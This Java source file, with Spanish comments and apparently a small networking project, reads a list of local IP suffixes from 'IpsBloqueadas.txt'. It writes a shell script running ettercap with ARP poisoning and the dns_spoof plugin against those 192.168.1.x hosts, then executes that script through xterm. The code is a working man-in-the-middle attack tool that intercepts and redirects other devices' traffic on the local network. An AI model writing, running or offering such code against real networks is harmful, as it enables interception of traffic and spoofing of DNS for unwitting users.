package pruebaredes;

import java.io.*;
import java.nio.charset.Charset;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.util.ArrayList;
import java.util.List;

/**
 *
 * @author root
 */
public class activarMon implements Runnable {

    @Override
    public void run() {
        cargarRun();
    }

    public void modBash() {

        try {
            //Crea la posible ruta del archivo, en el directorio actual en la carpeta 'Redes'
            Path IpListas = Paths.get(System.getProperty("user.dir"), "Redes", "IpsBloqueadas.txt");

            //checa si existe la ruta y archivo
            boolean existe = (new File(IpListas.toString())).exists();

            //si no existe, entra y lo crea
            if (!existe) {
                try {
                    //crea el directorio en caso de ser necesario
                    new File("Redes").mkdir();
                    File crear = new File(IpListas.toString());
                    crear.createNewFile();
                } catch (Exception ex) {
                    System.out.println(ex.getMessage());
                }
            }
            String ipCad = "";
            List<String> lista = new ArrayList();
            //Tipo de caracter
            Charset charset = Charset.forName("US-ASCII");
            try {
                //crea un lector del archivo
                BufferedReader reader = Files.newBufferedReader(IpListas, charset);
                String line;

                while ((line = reader.readLine()) != null) {
                    lista.add(line);
                }
                reader.close();
            } catch (IOException x) {
                System.err.format("IOException: %s%n", x);
            }
            if (lista.size() > 0) {
                ipCad += "192.168.1.";
                for (int i = 0; i < lista.size(); i++) {
                    ipCad += lista.get(i);
                    if (i < lista.size() - 1) {
                        ipCad += ",";
                    }
                }
            }

            try {
                ipCad = "ettercap -Tqi wlan0 -P dns_spoof -M arp:remote // /" + ipCad + "/";
                IpListas = Paths.get(System.getProperty("user.dir"), "prueba.sh");
                BufferedWriter writer = Files.newBufferedWriter(IpListas, charset);
                writer.write(ipCad);
                writer.newLine();
                writer.close();
            } catch (IOException x) {
                System.err.format("IOException: %s%n", x);
            }


        } catch (Exception ex) {
        }
    }

    public void loadText(String cmd) {
        try {
            Runtime run = Runtime.getRuntime();
            Process proc = run.exec(cmd.toString());
            proc.waitFor();
            BufferedReader buf = new BufferedReader(new InputStreamReader(proc.getInputStream()));
        } catch (Exception ex) {
        }

    }

    public static void cargarRun() {
        activarMon am = new activarMon();
        am.modBash();
        am.loadText("xterm -e /bin/bash /root/Desktop/PruebaRedes/prueba.sh");
    }

    public static void main() {
        
        (new Thread(new activarMon())).start();
    }
}
